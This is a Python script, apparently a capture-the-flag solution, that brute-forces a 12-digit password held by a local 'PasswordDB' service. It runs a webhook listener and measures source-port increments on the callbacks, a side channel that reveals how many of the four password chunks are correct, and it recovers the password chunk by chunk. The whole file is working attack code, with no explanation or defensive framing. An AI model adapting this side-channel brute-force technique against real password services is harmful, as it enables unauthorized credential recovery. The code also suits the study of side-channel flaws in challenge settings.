#!/usr/bin/env python

import SocketServer
import threading
import json
import sys
import os
import logging
import collections
from Queue import Queue

# Inser lib/ path into library path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "lib"))

import requests

log = logging.getLogger(__name__)


#: Public facing address
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 50012
#: URL to the PasswordDB server API endpoint.
PWDB_URL = "http://127.0.0.1:3000/"


# Synchronized queue for inter-thread communication
it_queue = Queue()
# Queue used inside the server-thread for communication between server and
# handler.
server_queue = Queue()


class RequestResult(object):
    def __init__(self, source_port):
        self.source_port = source_port
        self.success = None

    def __repr__(self):
        return "<RequestResult(source_port={})>".format(self.source_port)


class WebhookServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):

    allow_reuse_address = True

    def __init__(self, server_address):
        # Haha, old-style classes, can't use super() here. :D
        SocketServer.TCPServer.__init__(self, server_address, WebhookHandler)

    def verify_request(self, request, client_address):
        result = RequestResult(client_address[1])
        server_queue.put(result)

        return True


class WebhookHandler(SocketServer.BaseRequestHandler):

    def handle(self):
        # Annotate the previous result with the success status.
        result = server_queue.get()

        data = self.request.recv(1024)
        lines = data.split('\r\n')
        try:
            success = json.loads(lines[-1])['success']
        except ValueError:
            success = False

        result.success = success
        it_queue.put(result)

        # No need to, but keeps the server log clean.
        self.request.sendall("HTTP/1.0 200 Ok\r\n\r\n")


class Client(object):
    """Client trying to break the password that is supposed to be 4 * 3
    characters, devided into same-length chunks.
    """

    PASSWORD_LENGTH = 12
    CHUNKS = 4
    #: Required confirmations before a value is considered confirmed.
    CONFIRMATIONS = 3
    #: The minimum of source port increments, ie. a password with the first
    #: chunk wrong. This depends on your network configuration, required DNS
    #: lookups and so on.
    MIN_SOCKETS = 3
    #: How much weirdness until we go insane?
    INSANITY = 5

    def __init__(self):
        self.chunk = 0
        self.counter = 0
        self.verified_chunks = []
        self.last_source_port = 0
        self.weirdness = 0

        self.delta_confirmer = DeltaConfirmer(self.CONFIRMATIONS)


    def generate_pw(self):
        """Generate PW based on the current state, ie. current chunk,
        previously computed chunks and the current counter.
        """

        chunks = []
        for chunk_no in range(self.CHUNKS):
            if chunk_no < self.chunk:
                chunks.append(self.verified_chunks[chunk_no])
            elif chunk_no == self.chunk:
                chunks.append(str(self.counter).zfill(self.PASSWORD_LENGTH /
                                                      self.CHUNKS))
            else:
                chunks.append("000")

        return "".join(chunks)

    def run(self):
        webhooks = ["{}:{}".format(SERVER_HOST, SERVER_PORT)]

        while self.chunk < self.CHUNKS:
            pw = self.generate_pw()
            payload = json.dumps({"password": pw, "webhooks": webhooks})
            requests.post(PWDB_URL, data=payload)

            # Block until we receive a result from the server thread.
            result = it_queue.get()

            if result.success:
                print("SUCCESS: {}".format(self.generate_pw()))
                return

            delta = self.delta_confirmer.confirm(result)
            log.debug("delta={}, pw={}".format(delta, pw))
            # Not a stable data, run again.
            if delta < 1:
                continue

            self.consider_delta(delta)

        sys.stderr.write("Could not find password. Is it non-numeric?")

    def consider_delta(self, delta):
        if delta == (self.MIN_SOCKETS + self.chunk):
            self.counter += 1
        elif delta == (self.MIN_SOCKETS + self.chunk + 1):
            log.info("Found chunk #{}. Current PW: {}".format(
                self.chunk, self.generate_pw()))
            self.verified_chunks.append(str(self.counter))
            self.chunk += 1
            self.delta_confirmer.reset()
            self.weirdness /= 2
        else:
            log.error("Weird delta={} at chunk={}. "
                          "Resetting current chunk state.".format(
                              delta, self.chunk))
            self.weirdness += 1
            self.counter = 0
            self.delta_confirmer.reset()

            if self.weirdness >= self.INSANITY:
                log.error("This is bat-shit crazy. Giving up.")
                sys.exit(1)


class DeltaConfirmer(object):

    def __init__(self, confirmations):
        self.confirmations = confirmations
        self.last_source_port = 0

        self.reset()

    def reset(self):
        self.ringbuffer = collections.deque(maxlen=self.confirmations)

    def confirm(self, result):
        """Calculate the delta from the result."""

        delta = result.source_port - self.last_source_port
        self.last_source_port = result.source_port

        # Either first connect or counter reset
        if delta < 1:
            return delta

        self.ringbuffer.append(delta)

        if len(self.ringbuffer) == self.confirmations:
            value = self.ringbuffer.popleft()
            if all(map(lambda x: x == value, self.ringbuffer)):
                return value

        return -1


def start_server():
    server = WebhookServer(("0.0.0.0", SERVER_PORT))
    server_thread = threading.Thread(target=server.serve_forever)

    # Exit when main thread exists
    server_thread.daemon = True
    server_thread.start()


if __name__ == "__main__":
    level = logging.WARNING

    if len(sys.argv) > 1 and sys.argv[1] == "-v":
        level = logging.INFO
    if len(sys.argv) > 1 and sys.argv[1] == "-d":
        level = logging.DEBUG

    log.setLevel(level=level)
    log.addHandler(logging.StreamHandler())

    start_server()

    client = Client()
    client.run()
